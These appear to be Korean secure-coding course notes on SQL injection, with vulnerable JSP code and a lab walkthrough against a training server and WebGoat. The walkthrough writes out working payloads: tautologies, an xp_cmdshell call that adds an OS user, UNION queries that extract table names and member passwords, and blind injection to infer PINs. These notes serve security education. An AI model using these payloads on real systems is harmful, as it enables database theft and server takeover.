## part 04. 보안취약점 제거를 위한 코딩 기법

### 1. 입력값 검증 부재와 삽입

- 규범화(Canonicalization): 데이터 손실 없이 입력 데이터를 가장 간단하면서 대등한 형태로 축소하는 과정
- 정규화(Normalization): 데이터 손실은 있지만 알려진 가장 간단한 형태로 변환하는 과정
- 새니타이즈(Sanitization): 데이터를 받은 서브시스템의 요구사항에 맞게 데이터를 가공하는 과정
- 검증(Validation): 입력 데이터가 프로그램의 정당한 프로그램 입력 영역 안에 있는지 확인하는 과정



#### - SQL 삽입

피해: 1. DB 정보 열람 및 추가, 수정, 삭제/ 2. 프로시저를 통해 운영체제 명령어 수행/ 3. 웹 애플리케이션을 조정		해  다른 시스템 공격/ 4. 외부 프로그램 사용/ 5. 불법 로그인/

search.jsp

\-----------------------------

String ptext = request.getParameter("text");

String query = "select * from data where keyword = '" + ptext + "'";

Statement stmt = connection.createStatement();

stmt.executeQuery(query);

정상적인 요청 ⇒ search.jsp?text=abcd

⇒ select * from data where keyword = 'abcd'

비정상적인 요청 - SQL Injection 공격 유형



#1 항상 참이 되는 입력 -> 모든내용이 반환 = 권한 밖의 데이터에 대해 접근이 가능.

⇒ search.jsp?text=abcd' or 'a' = 'a

⇒ select * from data where keyword = 'abcd' or 'a' = 'a'

⇒ data 테이블에 모든 데이터를 조회해서 반환



\#2 오류를 유발하는 입력

⇒ search.jsp?text=abcd'

⇒ select * from data where keyword = 'abcd''

→ 홑따움표의 개수가 일치하지 않아서 오류가 발생 → 오류 메시지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력될 수 있음



 #3 Stored Procedure를 호출하는 입력 => DB 서버의 제어권 탈취에 사용

⇒ search.jsp?text=abcd'; exec xp_cmdshell 'net user hack hack /add'; --

⇒ select * from data where keyword = 'abcd'; exec xp_cmdshell 'net user hack hack /add'; --'



#4. UNION 구문을 이용한 호출 

UNION 구문 설명 ⇒ [https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_%EC%97%B0%EC%82%B0%EC%9E%90](https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_연산자)

우편번호 조회 서비스

<http://70.12.50.56:9090/zipcode.asp>?dong=하대동

⇒ select * from address where dong = '하대동'

우편번호 조회 서비스 결과에 공격자가 원하는 정보가 함께 출력되도록 입력값 조작

select * from address where dong = '하대동' UNION select * from user --'

⇒ <http://70.12.50.56:9090/zipcode.asp>?dong=하대동' UNION select * from user --

UNION 구문을 사용하기 위한 전제 조건

1. 컬럼의 개수와 데이터 타입이 동일해야 한다. ⇒ 정상 쿼리(우편번호 조회 쿼리) 실행을 통해서 반환되는 컬럼의 개수와 각 컬럼의 데이터 타입을 확인해야 한다.
2. 공격자가 원하는 정보를 포함하고 있는 테이블과 컬럼의 이름을 알고 있어야 한다. ⇒ 외부에서 (또는 검색을 통해서) 확인 가능한 DBMS의 시스템 테이블을 우선적으로 사용해야 한다.

LAB 우편번호 조회 서비스를 이용해서 해당 사이트([http://70.12.50.56:9090](http://70.12.50.56:9090/zipcode.asp))의 계정을 탈취해서 로그인해 보세요.

\-1 우편번호 조회 서비스를 통해서 반환하는 컬럼의 개수를 확인

select * from address where dong = 'a' order by 1 --' 

⇒ .../zip_code.asp?dong=a' order by 1 --

⇒ .../zip_code.asp?dong=a' order by 8 --

Microsoft OLE DB Provider for SQL Server 오류 '80040e14'

ORDER BY 위치 번호 8이(가) SELECT 목록의 항목 번호 범위를 벗어났습니다.

/zip_search.asp, 줄 21

→ 우편번호 조회 서비스를 위한 쿼리는 7개의 컬럼을 반환한다.

⇒ Error-Based SQL Injection

-2 UNION 구문을 이용해서 숫자로 구성된 7개의 값을 출력

select * from address where dong = 'a' and 1=2 UNION select 1,2,3,4,5,6,7 --' 

⇒ .../zip_code.asp?dong=a' and 1=2 UNION select 1,2,3,4,5,6,7 --

Microsoft OLE DB Provider for SQL Server 오류 '80040e07'

varchar 값 '110-753'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.

/zip_search.asp, 줄 21

\-3 UNION 구문을 이용해서 해당 DBMS의 종류를 확인

select * from address where dong = 'a' and 1=2 UNION select 1,db_name(),@@version,4,5,6,7 --' 

-4 MS-SQL의 시스템 테이블을 이용해서 해당 DB에서 사용하고 있는 사용자 테이블 목록을 조회

<https://docs.microsoft.com/ko-kr/sql/relational-databases/system-tables/system-base-tables?view=sql-server-2017>

<https://docs.microsoft.com/ko-kr/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql?view=sql-server-2017>

select * from address where dong = 'a' and 1=2 UNION select 1,id,name,4,5,6,7 from sysobjects where xtype='U' --' 

-5 member 테이블의 컬럼 정보(이름)를 조회

<https://docs.microsoft.com/ko-kr/sql/relational-databases/system-compatibility-views/sys-syscolumns-transact-sql?view=sql-server-2017>

select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=2073058421 --' 

select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=(select id from sysobjects where name='member') --' 

\-6 member 테이블에 정보를 조회

select * from address where dong = 'a' and 1=2 UNION select 1,bId,bName,bPass,bMail,bPhone,7 from member --'



#5. Blind SQL Injection 

⇒ 참인 조건과 거짓인 조건에 따라 서버의 반응이 다른 것을 이용한 공격 기법

WebGoat > Injection Flaws > Blind Numeric SQL Injection 

입력한 계정 번호(account number)의 유효성 검증을 수행해주는 서비스

서버 내부 처리를 예측

select * from accounts where account_no = 101

→ 결과가 있으면 → Account number is valid.

→ 결과가 없으면 → Invalid account number.

select * from accounts where account_no = 101 and 1=1

→ 결과가 있을 듯 → Account number is valid.

select * from accounts where account_no = 101 and 1=2

→ 결과가 없을 듯 → Invalid account number.

문제 : pins 테이블에서 cc_number의 값이 1111222233334444인 pin 값을 구하시오. ⇒ select pin from pins where cc_number = '1111222233334444'

select * from accounts where account_no = 101 and (select pin from pins where cc_number = '1111222233334444') = 2364

→ Account number is valid. ⇒ 참

→ Invalid account number. ⇒ 거짓

WebGoat > Injection Flaws > Blind String SQL Injection 

문제 : pins 테이블에서 cc_number의 값이 4321432143214321인 name 컬럼의 값을 구하시오.

select * from accounts where account_no = 101 and (select substr(name,1,1) from pins where cc_number = '4321432143214321') = 'J'

select * from accounts where account_no = 101 and (select ascii(substr(name,1,1)) from pins where cc_number = '4321432143214321') < 90

select * from accounts where account_no = 101 and (select substr(name,2,1) from pins where cc_number = '4321432143214321') = 'i'

select * from accounts where account_no = 101 and (select substr(name,3,1) from pins where cc_number = '4321432143214321') = 'l'

select * from accounts where account_no = 101 and (select name from pins where cc_number = '4321432143214321') = 'Jill'

